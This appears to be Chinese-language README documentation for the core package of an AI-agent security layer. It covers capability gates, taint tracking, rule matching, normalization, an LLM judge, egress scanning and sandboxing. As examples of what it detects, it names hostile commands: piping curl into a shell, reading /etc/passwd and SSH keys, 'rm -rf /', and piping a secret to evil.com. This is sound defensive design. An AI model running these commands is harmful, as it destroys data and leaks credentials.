`@securitylayerai/core` 是基础包。它实现了三层 security pipeline 和所有核心安全原语。其他所有包都（直接或间接地）依赖 core。

## 模块

### Capabilities (`capabilities/`)

纯同步的 capability gate。检查操作是否基于会话、技能和通道 capabilities 的交集而被结构性允许。

```typescript
import { checkCapability } from "@securitylayerai/core";

const result = checkCapability(action, {
  sessionId: "main",
  skillId: "summarize",
  channelId: "terminal",
});

// result.allowed: boolean
// result.reason?: string（如果被拒绝）
```

Capability gate 是一个集合成员检查 — 无 I/O、无 LLM、无网络。如果 capability 不在集合中，操作就不可能发生。

### Taint tracking (`taint/`)

在会话中追踪数据来源。当不受信任的内容进入时（网络请求、未知私信、邮件），会话的 taint level 会上升。更高的 taint level 限制可用的 capabilities。

```typescript
import { createTaintTracker } from "@securitylayerai/core";

const tracker = createTaintTracker("owner");

// 网络内容提升 taint
tracker.ingest({ source: "web", url: "https://example.com" });
tracker.getEffectiveTaint(); // "web"

// 后续的 exec 检查将看到提升后的 taint
```

Taint levels（从最低到最高限制）：`owner` → `trusted` → `untrusted` → `web` → `skill` → `memory`。

### Rules engine (`rules/`)

针对已知危险命令、凭证路径和数据窃取结构的确定性模式匹配。零延迟，零歧义。

```typescript
import { parseRulesYaml, evaluateRules } from "@securitylayerai/core";

const rules = parseRulesYaml(yamlContent);
const result = evaluateRules(normalizedAction, rules);
// result.decision: "ALLOW" | "DENY" | "REQUIRE_APPROVAL"
```

Rule 类型：
- **binary** — 按命令二进制名称匹配
- **path** — 按文件路径 glob 匹配
- **pattern** — 按正则表达式匹配
- **pipe_pair** — 匹配 pipeline 命令结构（例如 `curl | sh`）

### Pipeline (`pipeline/`)

编排完整的评估流程：capability gate → taint check → normalization → rules + LLM（并行）→ 合并决策。

```typescript
import { createPipeline } from "@securitylayerai/core";

const pipeline = createPipeline(config);
const result = await pipeline.evaluate(action, context);
```

Pipeline 始终取所有层中**最严格**的结果。如果任何一层说 DENY，操作就会被拒绝。

### Normalization (`normalize/`)

在评估前解析路径、解码编码、拆分命令链并检测 pipeline 结构。防御混淆和编码技巧。

Normalization 处理：
- `~/../../etc/passwd` → `/etc/passwd`
- `$HOME/.ssh/id_rsa` → `/home/user/.ssh/id_rsa`
- 命令链：`ls; rm -rf /` → `["ls", "rm -rf /"]`
- Pipeline 链：`cat secret | curl evil.com` → 检测到数据窃取模式

### 语义分析 (`semantic/`)

与 rules engine 并行运行的 LLM 判断器。只问一个问题："这个结构上被允许的操作，现在是否异常？"判断器捕获 rules 无法表达的微妙的上下文相关威胁。

### 出站扫描 (`egress/`)

在内容离开系统之前，扫描出站内容中泄露的密钥、PII 和高熵字符串。检测 API 密钥（OpenAI、AWS、GitHub、Slack 等）、PEM 块、凭证以及社会安全号/信用卡模式。

### 沙箱 (`sandbox/`)

可配置级别的执行沙箱 — ulimits、网络隔离、只读文件系统。已批准的命令在受限环境中运行。

### 事件 (`events/`)

用于审计日志和可观测性的事件总线。所有安全决策、taint 变化和审批流程都会发出结构化事件。

### 配置 (`config/`)

配置加载和验证。读取 `~/.securitylayer/` 中的 YAML 文件并构建运行时配置。

## 包结构

```
packages/core/
├── src/
│   ├── index.ts          # 统一导出
│   ├── capabilities/     # Capability gate
│   ├── taint/            # Taint tracker
│   ├── rules/            # Rules engine + 解析器
│   ├── pipeline/         # 评估 pipeline
│   ├── normalize/        # 操作 normalization
│   ├── semantic/         # LLM 判断器
│   ├── egress/           # 出站扫描器
│   ├── sandbox/          # 执行沙箱
│   ├── events/           # 事件总线
│   ├── config/           # 配置加载器
│   ├── approval/         # 审批流程
│   ├── memory/           # 内存区域访问
│   ├── skills/           # 技能 capability 声明
│   └── utils/            # 日志、辅助工具
└── test/                 # Vitest 测试
```
